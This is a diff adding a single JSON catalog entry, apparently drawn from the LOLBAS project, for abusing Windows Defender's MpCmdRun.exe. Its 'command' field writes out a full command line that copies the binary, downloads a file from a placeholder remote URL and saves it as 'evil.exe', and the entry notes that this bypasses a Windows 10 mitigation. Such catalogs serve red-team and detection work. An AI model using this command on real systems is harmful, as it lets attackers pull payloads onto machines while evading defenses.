@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-mpcmdrun-exe-download-2",
+  "name": "LOLBAS · MpCmdRun.exe (Download) #2",
+  "command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe",
+  "description": "Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "mpcmdrun",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/MpCmdRun/",
+  "upstream_id": "MpCmdRun.exe/Download/1",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — MpCmdRun.exe",
+      "url": "https://lolbas-project.github.io/lolbas/MpCmdRun/"
+    }
+  ]
+}
